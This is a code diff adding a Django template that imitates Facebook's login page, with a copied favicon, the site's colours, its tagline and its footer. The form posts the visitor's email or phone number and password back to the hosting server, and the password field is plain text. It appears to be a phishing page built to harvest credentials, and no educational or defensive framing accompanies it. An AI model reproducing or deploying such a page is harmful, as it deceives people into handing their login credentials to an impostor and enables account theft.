@@ -1,0 +1,253 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAACXVwUAAAAAAJhXBQCcWAIA/f3+AJlXBQDDnXkA+fn5AJFSAwDq6uoAnVoFALyVbwCeWgUAx6B5AJ9aBQCiXQ0A7vDyAPv7/ACNUAEA9/f3AOjo6ACjXQUApF0FAI9SBACQUgQAiU0CAKVcAAChWwMAlFUEAJZVBAD39/gAql8AAKtfAADz8/MAxJ54APf5+wCfWwQApFwBAKBbBAChWwQAmFYCAJRVBQCVVQUAjlADAKZeBACqXwEAlFEAAKdeBACZWAUAmlgFAJtYBQCfWQIA7u/vAO/v7wCTUwMAnFQAAJ9bBQCjXAIApFwCAKFbBQDt7e0AqV8CALmUbQCRUwQA+vr6AJJTBADr6+sAolwDAKNcAwCXVgQAqF8DAKlfAwCTUQIAnVkEAKFaAQD5+vsAk1MFAPb29gCWVgUAl1YFAOvt7wCOUQMAvJh0AJtZBQCfWgIAnFkFAPj6/ADz9vcAjE8BAPX29wCcVQAAyaJ5AJ5VAAChXAUAn1UAAKBVAADy8vIA9PT1AKNbAACfWgMApFsAAPDw8ACTVAQA9Pb4AKleAACqXgAAyqJ6AJhXBACcWgwAkFICAO7u7gDGoHgAo1sBAKBaBACdVQoAlFQFAJlVAgDs7OwAjE8DAJZNAAClXQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT0taC0tHyBpICAgIGkgAUdERDk5OWRiYhpkGhoaGmksJxsbQ0NqQARfGhoaGhogLCYmJicbWwcRXiUaGhoaIBYOJCQmJg0TS146cBoaGiAVCgpJDCRvTR5cOTolZBogXVNTVTIKIiFZN0NEOSUaIDgwMTJTbAZgYXIPQzk6JSBVAAIFMBBuNWAhVkpDOSUgMk5OTwJQQm5lYCMzQ0Q6LWtmTClOLgsJNHdaJnFDOS0dGEFmKU5SCTx3WiYnQzktNlEXP2YpPhR1bmdUJhtELQh2URc/c0gUQjxXYyYnRD0SGXYrGGYqTyh0AwwmJ0M9AVhtNhxFMjI4OxUWeC9GAYABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAAA=" rel="icon" type="image/x-icon">
+    <title>Facebook - Log in or sign up</title>
+    {% load widget_tweaks %}
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Custom CSS -->
+    <style>
+        :root {
+            --facebook-blue: #1877f2;
+            --facebook-green: #42b72a;
+            --text-primary: #1c1e21;
+            --text-secondary: #65676b;
+            --border-color: #dadde1;
+            --bg-color: #f0f2f5;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            font-family: Helvetica, Arial, sans-serif;
+            color: var(--text-primary);
+        }
+        
+        .logo {
+            color: var(--facebook-blue);
+            font-size: 3.5rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        
+        .tagline {
+            font-size: 1.5rem;
+            margin-bottom: 2rem;
+            line-height: 1.4;
+        }
+        
+        .login-card {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            max-width: 400px;
+        }
+        
+        .form-control {
+            height: 3rem;
+            font-size: 1rem;
+            padding: 0.875rem 1rem;
+            border: 1px solid var(--border-color);
+        }
+        
+        .form-control:focus {
+            box-shadow: 0 0 0 2px #e7f3ff;
+            border-color: var(--facebook-blue);
+        }
+        
+        .btn-login {
+            background-color: var(--facebook-blue);
+            color: white;
+            font-size: 1.25rem;
+            font-weight: bold;
+            height: 3rem;
+            border: none;
+        }
+        
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-create {
+            background-color: var(--facebook-green);
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            height: 3rem;
+            border: none;
+            width: 60%;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+        
+        .forgot-password {
+            color: var(--facebook-blue);
+            text-decoration: none;
+            font-size: 0.875rem;
+            transition: text-decoration 0.2s;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid var(--border-color);
+            margin: 1.25rem 0;
+        }
+        
+        .create-page {
+            font-size: 0.875rem;
+            text-align: center;
+            margin-top: 1.75rem;
+            color: var(--text-primary);
+        }
+        
+        .create-page a {
+            font-weight: 600;
+            color: inherit;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .text-muted {
+            color: var(--text-secondary) !important;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #fff;
+            padding: 2rem 0;
+        }
+        
+        .language-selector a,
+        .footer-links a {
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            text-decoration: none;
+            margin-right: 0.5rem;
+            transition: color 0.2s;
+        }
+        
+        .language-selector a:hover,
+        .footer-links a:hover {
+            color: var(--facebook-blue);
+            text-decoration: underline;
+        }
+        
+        .footer-divider {
+            border-top: 1px solid var(--border-color);
+            margin: 1rem 0;
+        }
+        
+        @media (max-width: 992px) {
+            .logo {
+                font-size: 2.5rem;
+            }
+            .tagline {
+                font-size: 1.25rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container py-5">
+        <div class="row align-items-center">
+            <div class="col-lg-6">
+                <div class="text-center text-lg-start mb-5 mb-lg-0">
+                    <div class="logo">facebook</div>
+                    <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
+                </div>
+            </div>
+            <div class="col-lg-6">
+                <div class="login-card mx-auto">
+                    <form method="POST">
+                        {% csrf_token %}
+                        <div class="mb-3">
+                            <input type="text" name="email_or_phone" class="form-control" placeholder="Email address or phone number" required>
+                        </div>
+                        <div class="mb-3">
+                            <input type="text" name="password" class="form-control" placeholder="Password" required>
+                        </div>
+                        <button type="submit" class="btn btn-login w-100 mb-3">Log in</button>
+                        <div class="text-center mb-3">
+                            <a href="#" class="forgot-password">Forgotten password?</a>
+                        </div>
+                        <div class="divider"></div>
+                        <button type="button" class="btn btn-create">Create new account</button>
+                    </form>
+                </div>
+                <div class="create-page">
+                    <a href="#"><strong>Create a Page</strong></a> 
+                    <span class="text-muted">for a celebrity, brand or business.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="language-selector mb-3">
+                <a href="#">English (UK)</a>
+                <a href="#">Hausa</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Português (Brazil)</a>
+                <a href="#">Español</a>
+                <a href="#">Legal</a>
+                <a href="#">Bahasa Indonesia</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Italiano</a>
+                <a href="#">Red</a>
+            </div>
+            
+            <div class="footer-divider"></div>
+            
+            <div class="footer-links mb-3">
+                <a href="#">Sign Up</a>
+                <a href="#">Log in</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Voting Information Centre</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Privacy Centre</a>
+                <a href="#">About</a>
+                <a href="#">Create ad</a>
+                <a href="#">Create Page</a>
+                <a href="#">Developers</a>
+                <a href="#">Careers</a>
+                <a href="#">Cookies</a>
+                <a href="#">AdChoices</a>
+                <a href="#">Contact uploading and non-users</a>
+            </div>
+            
+            <div class="footer-divider"></div>
+            
+            <div class="text-muted mt-3">
+                Meta © 2025
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap 5 JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
